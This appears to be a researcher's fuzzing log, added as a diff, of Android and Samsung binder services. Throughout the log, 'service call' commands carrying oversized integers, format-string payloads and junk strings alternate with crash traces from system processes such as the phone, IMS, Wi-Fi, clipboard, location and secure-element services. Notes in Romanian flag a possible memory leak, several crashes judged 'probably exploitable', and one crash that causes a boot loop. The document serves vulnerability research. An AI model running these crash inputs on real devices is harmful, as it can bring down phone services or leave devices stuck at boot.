+01-12 17:28:15.915 18440 18528 E AndroidRuntime:        at android.os.Parcel.readArrayList(Parcel.java:2769)
+01-12 17:28:15.915 18440 18528 E AndroidRuntime:        at android.content.pm.IShortcutService$Stub.onTransact(IShortcutService.java:472)
+01-12 17:28:15.915 18440 18528 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 17:28:15.915 18440 18528 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+
+service call phone 104 i32 "1" i64 "1" f "3.141592" 
+01-12 17:30:30.118  2106  2594 E AndroidRuntime: FATAL EXCEPTION: Binder:2106_5
+01-12 17:30:30.118  2106  2594 E AndroidRuntime: Process: com.android.phone, PID: 2106
+01-12 17:30:30.118  2106  2594 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 4314120048 byte allocation with 5364879 free bytes and 186MB until OOM, target footprint 10729759, growth limit 201326592
+01-12 17:30:30.118  2106  2594 E AndroidRuntime:        at android.os.Parcel.readParcelableArray(Parcel.java:3408)
+01-12 17:30:30.118  2106  2594 E AndroidRuntime:        at android.telephony.NetworkScanRequest.<init>(NetworkScanRequest.java:224)
+01-12 17:30:30.118  2106  2594 E AndroidRuntime:        at android.telephony.NetworkScanRequest.<init>(NetworkScanRequest.java:35)
+01-12 17:30:30.118  2106  2594 E AndroidRuntime:        at android.telephony.NetworkScanRequest$1.createFromParcel(NetworkScanRequest.java:280)
+01-12 17:30:30.118  2106  2594 E AndroidRuntime:        at android.telephony.NetworkScanRequest$1.createFromParcel(NetworkScanRequest.java:277)
+01-12 17:30:30.118  2106  2594 E AndroidRuntime:        at com.android.internal.telephony.ITelephony$Stub.onTransact$requestNetworkScan$(ITelephony.java:15395)
+01-12 17:30:30.118  2106  2594 E AndroidRuntime:        at com.android.internal.telephony.ITelephony$Stub.onTransact(ITelephony.java:5057)
+01-12 17:30:30.118  2106  2594 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 17:30:30.118  2106  2594 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+
+service call secims 39 i32 "268435455" i64 "295147905179352825855" i64 "0" 
+01-12 23:20:33.945  9744 10105 E AndroidRuntime: FATAL EXCEPTION: Binder:9744_3
+01-12 23:20:33.945  9744 10105 E AndroidRuntime: Process: com.sec.imsservice, PID: 9744
+01-12 23:20:33.945  9744 10105 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 1073741832 byte allocation with 5002158 free bytes and 507MB until OOM, target footprint 10004318, growth limit 536870912
+01-12 23:20:33.945  9744 10105 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-12 23:20:33.945  9744 10105 E AndroidRuntime:        at android.os.Parcel.readArrayList(Parcel.java:2769)
+01-12 23:20:33.945  9744 10105 E AndroidRuntime:        at com.sec.ims.IImsService$Stub.onTransact(IImsService.java:924)
+01-12 23:20:33.945  9744 10105 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 23:20:33.945  9744 10105 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+
+service call secims 47 i32 "1" i32 "0" f "3.141592" 
+01-12 23:22:35.504 26307 26408 E AndroidRuntime: FATAL EXCEPTION: Binder:26307_5
+01-12 23:22:35.504 26307 26408 E AndroidRuntime: Process: com.sec.imsservice, PID: 26307
+01-12 23:22:35.504 26307 26408 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 4314120048 byte allocation with 4244055 free bytes and 507MB until OOM, target footprint 8488111, growth limit 536870912
+01-12 23:22:35.504 26307 26408 E AndroidRuntime:        at android.os.Parcel.createString16Array(Parcel.java:1481)
+01-12 23:22:35.504 26307 26408 E AndroidRuntime:        at android.os.Parcel.createStringArray(Parcel.java:1416)
+01-12 23:22:35.504 26307 26408 E AndroidRuntime:        at com.sec.ims.IImsService$Stub.onTransact(IImsService.java:1024)
+01-12 23:22:35.504 26307 26408 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 23:22:35.504 26307 26408 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+
+
+service call secims 95 i32 "268435455" s16 "AAAAAAAAAA" s16 "AAAA" 
+01-12 23:25:15.909 26682 26860 E AndroidRuntime: Process: com.sec.imsservice, PID: 26682
+01-12 23:25:15.909 26682 26860 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 1073741832 byte allocation with 4788543 free bytes and 507MB until OOM, target footprint 9577087, growth limit 536870912
+01-12 23:25:15.909 26682 26860 E AndroidRuntime:        at android.os.Parcel.createString16Array(Parcel.java:1481)
+01-12 23:25:15.909 26682 26860 E AndroidRuntime:        at android.os.Parcel.createStringArray(Parcel.java:1416)
+01-12 23:25:15.909 26682 26860 E AndroidRuntime:        at com.sec.ims.IImsService$Stub.onTransact(IImsService.java:1521)
+01-12 23:25:15.909 26682 26860 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 23:25:15.909 26682 26860 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+
+service call secims 96 i64 "295147905179352825855" f "-1" 
+01-12 23:26:10.158 26928 26945 E AndroidRuntime: Process: com.sec.imsservice, PID: 26928
+01-12 23:26:10.158 26928 26945 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 8589934600 byte allocation with 4242846 free bytes and 507MB until OOM, target footprint 8485694, growth limit 536870912
+01-12 23:26:10.158 26928 26945 E AndroidRuntime:        at android.util.ArrayMap.allocArrays(ArrayMap.java:275)
+01-12 23:26:10.158 26928 26945 E AndroidRuntime:        at android.util.ArrayMap.<init>(ArrayMap.java:345)
+01-12 23:26:10.158 26928 26945 E AndroidRuntime:        at android.util.ArrayMap.<init>(ArrayMap.java:328)
+01-12 23:26:10.158 26928 26945 E AndroidRuntime:        at android.content.ContentValues.<init>(ContentValues.java:91)
+01-12 23:26:10.158 26928 26945 E AndroidRuntime:        at android.content.ContentValues.<init>(ContentValues.java:38)
+01-12 23:26:10.158 26928 26945 E AndroidRuntime:        at android.content.ContentValues$1.createFromParcel(ContentValues.java:530)
+01-12 23:26:10.158 26928 26945 E AndroidRuntime:        at android.content.ContentValues$1.createFromParcel(ContentValues.java:527)
+01-12 23:26:10.158 26928 26945 E AndroidRuntime:        at com.sec.ims.IImsService$Stub.onTransact(IImsService.java:1540)
+01-12 23:26:10.158 26928 26945 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 23:26:10.158 26928 26945 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+
+service call secims 96 i64 "295147905179352825854" i64 "295147905179352825855" f "3.141592" 
+01-12 23:26:43.114 27135 27324 E AndroidRuntime: Process: com.sec.imsservice, PID: 27135
+01-12 23:26:43.114 27135 27324 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 8589934600 byte allocation with 4250925 free bytes and 507MB until OOM, target footprint 8501853, growth limit 536870912
+01-12 23:26:43.114 27135 27324 E AndroidRuntime:        at android.util.ArrayMap.allocArrays(ArrayMap.java:275)
+01-12 23:26:43.114 27135 27324 E AndroidRuntime:        at android.util.ArrayMap.<init>(ArrayMap.java:345)
+01-12 23:26:43.114 27135 27324 E AndroidRuntime:        at android.util.ArrayMap.<init>(ArrayMap.java:328)
+01-12 23:26:43.114 27135 27324 E AndroidRuntime:        at android.content.ContentValues.<init>(ContentValues.java:91)
+01-12 23:26:43.114 27135 27324 E AndroidRuntime:        at android.content.ContentValues.<init>(ContentValues.java:38)
+01-12 23:26:43.114 27135 27324 E AndroidRuntime:        at android.content.ContentValues$1.createFromParcel(ContentValues.java:530)
+01-12 23:26:43.114 27135 27324 E AndroidRuntime:        at android.content.ContentValues$1.createFromParcel(ContentValues.java:527)
+01-12 23:26:43.114 27135 27324 E AndroidRuntime:        at com.sec.ims.IImsService$Stub.onTransact(IImsService.java:1540)
+01-12 23:26:43.114 27135 27324 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 23:26:43.114 27135 27324 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+
+service call sem_wifi 104 i32 "268435455" s16 "3%%n%x%%s%s%%n1" 
+01-12 23:28:26.808  9120 10969 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:9120_17
+01-12 23:28:26.808  9120 10969 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 1073741832 byte allocation with 12582912 free bytes and 591MB until OOM, target footprint 63334560, growth limit 671088640
+01-12 23:28:26.808  9120 10969 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-12 23:28:26.808  9120 10969 E AndroidRuntime:        at android.os.Parcel.createStringArrayList(Parcel.java:2967)
+01-12 23:28:26.808  9120 10969 E AndroidRuntime:        at com.samsung.android.wifi.ISemWifiManager$Stub.onTransact(ISemWifiManager.java:2244)
+01-12 23:28:26.808  9120 10969 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 23:28:26.808  9120 10969 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-12 23:28:27.051 10286 10481 E AndroidRuntime: FATAL EXCEPTION: BluetoothScanManager
+01-12 23:28:27.051 10286 10481 E AndroidRuntime: Process: com.android.bluetooth, PID: 10286
+01-12 23:28:27.051 10286 10481 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 23:28:27.076 10752 11663 E AndroidRuntime: FATAL EXCEPTION: GoogleApiHandler
+01-12 23:28:27.076 10752 11663 E AndroidRuntime: Process: com.google.android.gms.persistent, PID: 10752
+01-12 23:28:27.076 10752 11663 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root caus
+
+service call semclipboard 17 i32 "1" i32 "4294967294" i64 "295147905179352825855" 
+01-12 23:31:58.298  6107  6827 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:6107_C
+01-12 23:31:58.298  6107  6827 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 8589934600 byte allocation with 12582912 free bytes and 589MB until OOM, target footprint 65680472, growth limit 671088640
+01-12 23:31:58.298  6107  6827 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
+01-12 23:31:58.298  6107  6827 E AndroidRuntime:        at android.os.Parcel.createStringArrayList(Parcel.java:2967)
+01-12 23:31:58.298  6107  6827 E AndroidRuntime:        at android.content.ClipDescription.<init>(ClipDescription.java:388)
+01-12 23:31:58.298  6107  6827 E AndroidRuntime:        at android.content.ClipData.<init>(ClipData.java:1156)
+01-12 23:31:58.298  6107  6827 E AndroidRuntime:        at android.content.ClipData$1.createFromParcel(ClipData.java:1178)
+01-12 23:31:58.298  6107  6827 E AndroidRuntime:        at android.content.ClipData$1.createFromParcel(ClipData.java:1174)
+01-12 23:31:58.298  6107  6827 E AndroidRuntime:        at android.sec.clipboard.IClipboardService$Stub.onTransact(IClipboardService.java:533)
+01-12 23:31:58.298  6107  6827 E AndroidRuntime:        at android.os.Binder.execTransactInternal(Binder.java:1195)
+01-12 23:31:58.298  6107  6827 E AndroidRuntime:        at android.os.Binder.execTransact(Binder.java:1159)
+01-12 23:31:58.565 14000 14085 E AndroidRuntime: FATAL EXCEPTION: InferenceEngineManagerThread
+
+============================================================
+
+null ptr exceprion:
+service call phone 112 i32 "4294967294" s16 "3%%n%x%%s%s%%n1" s16 "AAAA"
+
+01-12 16:13:23.193  4596  4596 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 16:13:23.193  4596  4596 E AndroidRuntime: Process: com.android.phone, PID: 4596
+01-12 16:13:23.193  4596  4596 E AndroidRuntime: java.lang.NullPointerException: Attempt to invoke virtual method 'void com.android.internal.telephony.Phone.setPreferredNetworkType(int, android.os.Message)' on a null object reference
+01-12 16:13:23.193  4596  4596 E AndroidRuntime:        at com.android.phone.PhoneInterfaceManager$MainThreadHandler.handleMessage(PhoneInterfaceManager.java:795)
+01-12 16:13:23.193  4596  4596 E AndroidRuntime:        at android.os.Handler.dispatchMessage(Handler.java:106)
+01-12 16:13:23.193  4596  4596 E AndroidRuntime:        at android.os.Looper.loop(Looper.java:246)
+01-12 16:13:23.193  4596  4596 E AndroidRuntime:        at android.app.ActivityThread.main(ActivityThread.java:8653)
+01-12 16:13:23.193  4596  4596 E AndroidRuntime:        at java.lang.reflect.Method.invoke(Native Method)
+01-12 16:13:23.193  4596  4596 E AndroidRuntime:        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:602)
+01-12 16:13:23.193  4596  4596 E AndroidRuntime:        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1130)
+
+service call phone 112 i32 "4294967294" i64 "0" s16 "AAAA"
+01-12 16:19:35.631  9486  9486 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 16:19:35.631  9486  9486 E AndroidRuntime: Process: com.android.phone, PID: 9486
+01-12 16:19:35.631  9486  9486 E AndroidRuntime: java.lang.NullPointerException: Attempt to invoke virtual method 'void com.android.internal.telephony.Phone.setPreferredNetworkType(int, android.os.Message)' on a null object reference
+01-12 16:19:35.631  9486  9486 E AndroidRuntime:        at com.android.phone.PhoneInterfaceManager$MainThreadHandler.handleMessage(PhoneInterfaceManager.java:795)
+01-12 16:19:35.631  9486  9486 E AndroidRuntime:        at android.os.Handler.dispatchMessage(Handler.java:106)
+01-12 16:19:35.631  9486  9486 E AndroidRuntime:        at android.os.Looper.loop(Looper.java:246)
+01-12 16:19:35.631  9486  9486 E AndroidRuntime:        at android.app.ActivityThread.main(ActivityThread.java:8653)
+01-12 16:19:35.631  9486  9486 E AndroidRuntime:        at java.lang.reflect.Method.invoke(Native Method)
+01-12 16:19:35.631  9486  9486 E AndroidRuntime:        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:602)
+01-12 16:19:35.631  9486  9486 E AndroidRuntime:        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1130)
+
+service call phone 112 i32 "4294967294" f "3.141592" s16 "3%%n%x%%s%s%%n1" 
+01-12 16:20:37.590 11735 11735 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 16:20:37.590 11735 11735 E AndroidRuntime: Process: com.android.phone, PID: 11735
+01-12 16:20:37.590 11735 11735 E AndroidRuntime: java.lang.NullPointerException: Attempt to invoke virtual method 'void com.android.internal.telephony.Phone.setPreferredNetworkType(int, android.os.Message)' on a null object reference
+01-12 16:20:37.590 11735 11735 E AndroidRuntime:        at com.android.phone.PhoneInterfaceManager$MainThreadHandler.handleMessage(PhoneInterfaceManager.java:795)
+01-12 16:20:37.590 11735 11735 E AndroidRuntime:        at android.os.Handler.dispatchMessage(Handler.java:106)
+01-12 16:20:37.590 11735 11735 E AndroidRuntime:        at android.os.Looper.loop(Looper.java:246)
+01-12 16:20:37.590 11735 11735 E AndroidRuntime:        at android.app.ActivityThread.main(ActivityThread.java:8653)
+01-12 16:20:37.590 11735 11735 E AndroidRuntime:        at java.lang.reflect.Method.invoke(Native Method)
+01-12 16:20:37.590 11735 11735 E AndroidRuntime:        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:602)
+01-12 16:20:37.590 11735 11735 E AndroidRuntime:        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1130)
+
+service call phone 112 i32 "4294967294" i64 "295147905179352825855"
+01-12 16:22:05.226 14545 14545 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 16:22:05.226 14545 14545 E AndroidRuntime: Process: com.android.phone, PID: 14545
+01-12 16:22:05.226 14545 14545 E AndroidRuntime: java.lang.NullPointerException: Attempt to invoke virtual method 'void com.android.internal.telephony.Phone.setPreferredNetworkType(int, android.os.Message)' on a null object reference
+01-12 16:22:05.226 14545 14545 E AndroidRuntime:        at com.android.phone.PhoneInterfaceManager$MainThreadHandler.handleMessage(PhoneInterfaceManager.java:795)
+01-12 16:22:05.226 14545 14545 E AndroidRuntime:        at android.os.Handler.dispatchMessage(Handler.java:106)
+01-12 16:22:05.226 14545 14545 E AndroidRuntime:        at android.os.Looper.loop(Looper.java:246)
+01-12 16:22:05.226 14545 14545 E AndroidRuntime:        at android.app.ActivityThread.main(ActivityThread.java:8653)
+01-12 16:22:05.226 14545 14545 E AndroidRuntime:        at java.lang.reflect.Method.invoke(Native Method)
+01-12 16:22:05.226 14545 14545 E AndroidRuntime:        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:602)
+01-12 16:22:05.226 14545 14545 E AndroidRuntime:        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1130)
+
+service call sec_location 24 i32 "1" f "3.141592" s16 "3%%n%x%%s%s%%n1"
+01-12 16:29:31.894  4225  4919 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: SLocationService
+01-12 16:29:31.894  4225  4919 E AndroidRuntime: java.lang.NullPointerException: Attempt to invoke virtual method 'boolean java.lang.String.equals(java.lang.Object)' on a null object reference
+01-12 16:29:31.894  4225  4919 E AndroidRuntime:        at com.samsung.android.location.currentloc.d0.g(Unknown Source:21)
+01-12 16:29:31.894  4225  4919 E AndroidRuntime:        at com.samsung.android.location.currentloc.u.onLocationChanged(Unknown Source:2)
+01-12 16:29:31.894  4225  4919 E AndroidRuntime:        at com.samsung.android.location.lib.positioning.u.r(Unknown Source:16)
+01-12 16:29:31.894  4225  4919 E AndroidRuntime:        at com.samsung.android.location.lib.positioning.f.run(Unknown Source:6)
+01-12 16:29:31.894  4225  4919 E AndroidRuntime:        at android.os.Handler.handleCallback(Handler.java:938)
+01-12 16:29:31.894  4225  4919 E AndroidRuntime:        at android.os.Handler.dispatchMessage(Handler.java:99)
+01-12 16:29:31.894  4225  4919 E AndroidRuntime:        at android.os.Looper.loop(Looper.java:246)
+01-12 16:29:31.894  4225  4919 E AndroidRuntime:        at com.samsung.android.location.SLocationService.run(Unknown Source:18)
+01-12 16:29:31.894  4225  4919 E AndroidRuntime:        at java.lang.Thread.run(Thread.java:923)
+01-12 16:29:32.640 30197 30254 E AndroidRuntime: FATAL EXCEPTION: GoogleApiHandler
+01-12 16:29:32.640 30197 30254 E AndroidRuntime: Process: com.google.android.gms.persistent, PID: 30197
+01-12 16:29:32.640 30197 30254 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root caus
+
+service call phone 89 i32 "4294967294" i32 "268435455" i64 "0" 
+01-12 17:39:46.292 26599 26599 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 17:39:46.292 26599 26599 E AndroidRuntime: Process: com.android.phone, PID: 26599
+01-12 17:39:46.292 26599 26599 E AndroidRuntime: java.lang.NullPointerException: Attempt to invoke virtual method 'void com.android.internal.telephony.Phone.getPreferredNetworkType(android.os.Message)' on a null object reference
+01-12 17:39:46.292 26599 26599 E AndroidRuntime:        at com.android.phone.PhoneInterfaceManager$MainThreadHandler.handleMessage(PhoneInterfaceManager.java:769)
+01-12 17:39:46.292 26599 26599 E AndroidRuntime:        at android.os.Handler.dispatchMessage(Handler.java:106)
+01-12 17:39:46.292 26599 26599 E AndroidRuntime:        at android.os.Looper.loop(Looper.java:246)
+01-12 17:39:46.292 26599 26599 E AndroidRuntime:        at android.app.ActivityThread.main(ActivityThread.java:8653)
+01-12 17:39:46.292 26599 26599 E AndroidRuntime:        at java.lang.reflect.Method.invoke(Native Method)
+01-12 17:39:46.292 26599 26599 E AndroidRuntime:        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:602)
+01-12 17:39:46.292 26599 26599 E AndroidRuntime:        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1130)
+
+service call phone 89 f "-1" s16 "ÿÿfÿÿÿÿÿü" 
+01-12 17:40:40.234 29124 29124 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 17:40:40.234 29124 29124 E AndroidRuntime: Process: com.android.phone, PID: 29124
+01-12 17:40:40.234 29124 29124 E AndroidRuntime: java.lang.NullPointerException: Attempt to invoke virtual method 'void com.android.internal.telephony.Phone.getPreferredNetworkType(android.os.Message)' on a null object reference
+01-12 17:40:40.234 29124 29124 E AndroidRuntime:        at com.android.phone.PhoneInterfaceManager$MainThreadHandler.handleMessage(PhoneInterfaceManager.java:769)
+01-12 17:40:40.234 29124 29124 E AndroidRuntime:        at android.os.Handler.dispatchMessage(Handler.java:106)
+01-12 17:40:40.234 29124 29124 E AndroidRuntime:        at android.os.Looper.loop(Looper.java:246)
+01-12 17:40:40.234 29124 29124 E AndroidRuntime:        at android.app.ActivityThread.main(ActivityThread.java:8653)
+01-12 17:40:40.234 29124 29124 E AndroidRuntime:        at java.lang.reflect.Method.invoke(Native Method)
+01-12 17:40:40.234 29124 29124 E AndroidRuntime:        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:602)
+01-12 17:40:40.234 29124 29124 E AndroidRuntime:        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1130)
+
+service call phone 89 i32 "4294967294" i64 "295147905179352825855" i64 "1" 
+01-12 17:41:18.434 30955 30955 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 17:41:18.434 30955 30955 E AndroidRuntime: Process: com.android.phone, PID: 30955
+01-12 17:41:18.434 30955 30955 E AndroidRuntime: java.lang.NullPointerException: Attempt to invoke virtual method 'void com.android.internal.telephony.Phone.getPreferredNetworkType(android.os.Message)' on a null object reference
+01-12 17:41:18.434 30955 30955 E AndroidRuntime:        at com.android.phone.PhoneInterfaceManager$MainThreadHandler.handleMessage(PhoneInterfaceManager.java:769)
+01-12 17:41:18.434 30955 30955 E AndroidRuntime:        at android.os.Handler.dispatchMessage(Handler.java:106)
+01-12 17:41:18.434 30955 30955 E AndroidRuntime:        at android.os.Looper.loop(Looper.java:246)
+01-12 17:41:18.434 30955 30955 E AndroidRuntime:        at android.app.ActivityThread.main(ActivityThread.java:8653)
+01-12 17:41:18.434 30955 30955 E AndroidRuntime:        at java.lang.reflect.Method.invoke(Native Method)
+01-12 17:41:18.434 30955 30955 E AndroidRuntime:        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:602)
+01-12 17:41:18.434 30955 30955 E AndroidRuntime:        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1130)
+
+service call sec_location 24 i32 "1" i32 "0" s16 "ÿÿfÿÿÿÿÿü" 
+01-12 17:43:37.308  1810  2364 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: SLocationService
+01-12 17:43:37.308  1810  2364 E AndroidRuntime: java.lang.NullPointerException: Attempt to invoke virtual method 'boolean java.lang.String.equals(java.lang.Object)' on a null object reference
+01-12 17:43:37.308  1810  2364 E AndroidRuntime:        at com.samsung.android.location.currentloc.d0.g(Unknown Source:21)
+01-12 17:43:37.308  1810  2364 E AndroidRuntime:        at com.samsung.android.location.currentloc.u.onLocationChanged(Unknown Source:2)
+01-12 17:43:37.308  1810  2364 E AndroidRuntime:        at com.samsung.android.location.lib.positioning.u.r(Unknown Source:16)
+01-12 17:43:37.308  1810  2364 E AndroidRuntime:        at com.samsung.android.location.lib.positioning.f.run(Unknown Source:6)
+01-12 17:43:37.308  1810  2364 E AndroidRuntime:        at android.os.Handler.handleCallback(Handler.java:938)
+01-12 17:43:37.308  1810  2364 E AndroidRuntime:        at android.os.Handler.dispatchMessage(Handler.java:99)
+01-12 17:43:37.308  1810  2364 E AndroidRuntime:        at android.os.Looper.loop(Looper.java:246)
+01-12 17:43:37.308  1810  2364 E AndroidRuntime:        at com.samsung.android.location.SLocationService.run(Unknown Source:18)
+01-12 17:43:37.308  1810  2364 E AndroidRuntime:        at java.lang.Thread.run(Thread.java:923)
+01-12 17:43:38.124  3777  4776 E AndroidRuntime: FATAL EXCEPTION: highpool[1]
+01-12 17:43:38.124  3777  4776 E AndroidRuntime: Process: com.google.android.gms.persistent, PID: 3777
+01-12 17:43:38.124  3777  4776 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 17:43:38.126  3777  4664 E AndroidRuntime: FATAL EXCEPTION: GoogleApiHandler
+01-12 17:43:38.126  3777  4664 E AndroidRuntime: Process: com.google.android.gms.persistent, PID: 3777
+01-12 17:43:38.126  3777  4664 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root caus
+
+=================
+NULL ARRAY
+=================
+service call sec_location 28 f "-1" s16 "3%%n%x%%s%s%%n1" s16 "AAAA" 
+
+01-12 16:31:23.733 22938 23452 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: SLocationService
+01-12 16:31:23.733 22938 23452 E AndroidRuntime: java.lang.NullPointerException: Attempt to get length of null array
+01-12 16:31:23.733 22938 23452 E AndroidRuntime:        at com.samsung.android.location.SLocationService.l(Unknown Source:5)
+01-12 16:31:23.733 22938 23452 E AndroidRuntime:        at com.samsung.android.location.g.run(Unknown Source:4)
+01-12 16:31:23.733 22938 23452 E AndroidRuntime:        at android.os.Handler.handleCallback(Handler.java:938)
+01-12 16:31:23.733 22938 23452 E AndroidRuntime:        at android.os.Handler.dispatchMessage(Handler.java:99)
+01-12 16:31:23.733 22938 23452 E AndroidRuntime:        at android.os.Looper.loop(Looper.java:246)
+01-12 16:31:23.733 22938 23452 E AndroidRuntime:        at com.samsung.android.location.SLocationService.run(Unknown Source:18)
+01-12 16:31:23.733 22938 23452 E AndroidRuntime:        at java.lang.Thread.run(Thread.java:923)
+01-12 16:31:24.647 31229 31304 E AndroidRuntime: FATAL EXCEPTION: InferenceEngineManagerThread
+01-12 16:31:24.647 31229 31304 E AndroidRuntime: Process: com.samsung.android.rubin.app, PID: 31229
+01-12 16:31:24.647 31229 31304 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 16:31:24.652 31704 31704 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 16:31:24.652 31704 31704 E AndroidRuntime: Process: com.samsung.android.calendar, PID: 31704
+01-12 16:31:24.652 31704 31704 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root cause
+01-12 16:31:24.626 24568 25580 E AndroidRuntime: FATAL EXCEPTION: highpool[2]
+01-12 16:31:24.626 24568 25580 E AndroidRuntime: Process: com.google.android.gms.persistent, PID: 24568
+01-12 16:31:24.626 24568 25580 E AndroidRuntime: DeadSystemException: The system died; earlier logs will point to the root caus
+
+service call phone 85 f "-1" s16 "AAAA" 
+01-12 17:37:41.575 16143 16143 E AndroidRuntime: FATAL EXCEPTION: main
+01-12 17:37:41.575 16143 16143 E AndroidRuntime: Process: com.android.phone, PID: 16143
+01-12 17:37:41.575 16143 16143 E AndroidRuntime: java.lang.NullPointerException: Attempt to get length of null array
+01-12 17:37:41.575 16143 16143 E AndroidRuntime:        at com.android.internal.telephony.RIL.nvWriteCdmaPrl(RIL.java:4353)
+01-12 17:37:41.575 16143 16143 E AndroidRuntime:        at com.android.internal.telephony.Phone.nvWriteCdmaPrl(Phone.java:2876)
+01-12 17:37:41.575 16143 16143 E AndroidRuntime:        at com.android.phone.PhoneInterfaceManager$MainThreadHandler.handleMessage(PhoneInterfaceManager.java:749)
+01-12 17:37:41.575 16143 16143 E AndroidRuntime:        at android.os.Handler.dispatchMessage(Handler.java:106)
+01-12 17:37:41.575 16143 16143 E AndroidRuntime:        at android.os.Looper.loop(Looper.java:246)
+01-12 17:37:41.575 16143 16143 E AndroidRuntime:        at android.app.ActivityThread.main(ActivityThread.java:8653)
+01-12 17:37:41.575 16143 16143 E AndroidRuntime:        at java.lang.reflect.Method.invoke(Native Method)
+01-12 17:37:41.575 16143 16143 E AndroidRuntime:        at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:602)
+01-12 17:37:41.575 16143 16143 E AndroidRuntime:        at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1130)
+
+Mem leak
+====================
+posibil arb leak?
+service call secure_element 3 f "3.141592" s16 "AAAAAAAAAA" s16 "ÿÿfÿÿÿÿÿü" 
+Result: Parcel(
+  0x00000000: fffffffc 00000017 00650072 00640061 '........r.e.a.d.'
+  0x00000010: 00720065 006d0020 00730075 00200074 'e.r. .m.u.s.t. .'
+  0x00000020: 006f006e 00200074 00650062 006e0020 'n.o.t. .b.e. .n.'
+  0x00000030: 006c0075 0000006c 00000000          'u.l.l.......    ')
+service call secure_element 3 i32 "1" f "3.141592" s16 "3%%n%x%%s%s%%n1" 
+Result: Parcel(
+  0x00000000: fffffffc 00000017 00650072 00640061 '........r.e.a.d.'
+  0x00000010: 00720065 006d0020 00730075 00200074 'e.r. .m.u.s.t. .'
+  0x00000020: 006f006e 00200074 00650062 006e0020 'n.o.t. .b.e. .n.'
+  0x00000030: 006c0075 0000006c 00000000          'u.l.l.......    ')
+======================
+Probabil exploatabil:
+======================
+
+
+service call sensorservice 6 i32 "1" i64 "1" f "3.141592"
+crash nu stim se loopuie cand crashuie in boot logo
+
+service call sensorservice 6 i32 "4294967294" i64 "295147905179352825855" s16 "ÿÿfÿÿÿÿÿü" 
+
+service call sem_wifi 104 i32 "268435455" f "-1" s16 "3%%n%x%%s%s%%n1" 
+01-12 23:30:11.390  1150  3650 E AndroidRuntime: !@*** FATAL EXCEPTION IN SYSTEM PROCESS: Binder:1150_19
+01-12 23:30:11.390  1150  3650 E AndroidRuntime: java.lang.OutOfMemoryError: Failed to allocate a 1073741832 byte allocation with 12582912 free bytes and 572MB until OOM, target footprint 83791624, growth limit 671088640
+01-12 23:30:11.390  1150  3650 E AndroidRuntime:        at java.util.ArrayList.<init>(ArrayList.java:166)
